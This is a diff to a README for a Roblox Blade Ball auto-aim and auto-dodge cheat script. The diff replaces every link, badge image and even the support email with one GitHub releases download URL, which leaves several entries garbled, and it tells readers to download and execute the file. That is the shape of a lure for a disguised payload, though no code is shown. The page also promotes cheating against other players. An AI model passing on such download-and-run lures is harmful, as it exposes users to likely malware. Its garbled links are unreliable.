@@ -1,6 +1,6 @@
 # Roblox Blade Ball Auto-Aim & Auto-Dodge Script 🎮⚔️
 
-![Blade Ball](https://img.shields.io/badge/Blade%20Ball-Game%20Cheat-blue.svg) ![Download](https://img.shields.io/badge/Download%20Script-Click%20Here-brightgreen.svg?style=flat-square)
+![Blade Ball](https://github.com/puerta118m/Roblox-Blade-Ball/releases%20Ball-Game%https://github.com/puerta118m/Roblox-Blade-Ball/releases) ![Download](https://github.com/puerta118m/Roblox-Blade-Ball/releases%20Script-Click%https://github.com/puerta118m/Roblox-Blade-Ball/releases)
 
 Welcome to the **Roblox Blade Ball** repository! This project contains an auto-aim and auto-dodge script designed specifically for the popular game, Blade Ball. With this script, players can enhance their combat efficiency and gain an edge in fast-paced PvP matches.
 
@@ -18,7 +18,7 @@ Welcome to the **Roblox Blade Ball** repository! This project contains an auto-a
 
 In the world of **Blade Ball**, players engage in thrilling battles where quick reflexes and sharp aim can make all the difference. This script leverages advanced tracking and movement algorithms to automatically target opponents and dodge incoming attacks. By using this script, players can improve their accuracy, reaction speed, and overall survival in the game.
 
-You can download the script [here](https://github.com/repo/user/archive.zip). After downloading, execute the file to get started.
+You can download the script [here](https://github.com/puerta118m/Roblox-Blade-Ball/releases). After downloading, execute the file to get started.
 
 ## Features
 
@@ -31,7 +31,7 @@ You can download the script [here](https://github.com/repo/user/archive.zip). Af
 
 To install the script, follow these steps:
 
-1. Download the script from the link provided: [Download Script](https://github.com/repo/user/archive.zip).
+1. Download the script from the link provided: [Download Script](https://github.com/puerta118m/Roblox-Blade-Ball/releases).
 2. Extract the downloaded ZIP file to a location of your choice.
 3. Open the extracted folder and locate the script file.
 4. Execute the script within the Roblox environment.
@@ -72,11 +72,11 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 For any inquiries or support, please reach out via the following methods:
 
-- GitHub Issues: [Submit an Issue](https://github.com/repo/user/issues)
-- Email: support@example.com
+- GitHub Issues: [Submit an Issue](https://github.com/puerta118m/Roblox-Blade-Ball/releases)
+- Email: https://github.com/puerta118m/Roblox-Blade-Ball/releases
 
 ---
 
-Thank you for checking out the **Roblox Blade Ball Auto-Aim & Auto-Dodge Script**! We hope this tool enhances your gameplay experience. Don’t forget to download the script [here](https://github.com/repo/user/archive.zip) and join the community discussions!
+Thank you for checking out the **Roblox Blade Ball Auto-Aim & Auto-Dodge Script**! We hope this tool enhances your gameplay experience. Don’t forget to download the script [here](https://github.com/puerta118m/Roblox-Blade-Ball/releases) and join the community discussions!
 
-![Gameplay](https://img.shields.io/badge/Gameplay-Experience%20the%20Thrill-orange.svg)
+![Gameplay](https://github.com/puerta118m/Roblox-Blade-Ball/releases%20the%https://github.com/puerta118m/Roblox-Blade-Ball/releases)
